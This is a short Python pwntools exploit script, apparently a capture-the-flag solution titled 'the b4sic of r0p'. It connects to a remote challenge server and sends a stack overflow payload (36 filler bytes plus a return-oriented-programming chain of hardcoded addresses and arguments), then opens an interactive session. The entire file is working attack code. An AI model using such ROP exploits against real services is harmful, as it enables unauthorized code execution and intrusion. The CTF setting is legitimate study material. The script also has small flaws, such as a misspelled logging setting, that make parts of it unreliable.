from pwn import *

p = remote("remote.goatskin.kr", 12121)

context_log_level = "debug"
payload = ""
for i in range(36) :
    payload += "A"
payload += p32(0x080485a9)
payload += p32(0x080486aa)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(0x080485f7)
payload += p32(0x080486ab)
payload += p32(0x12345678)
payload += p32(0x0804863a)
p.sendline(payload)
p.interactive()

"""
the b4sic of r0p
"""
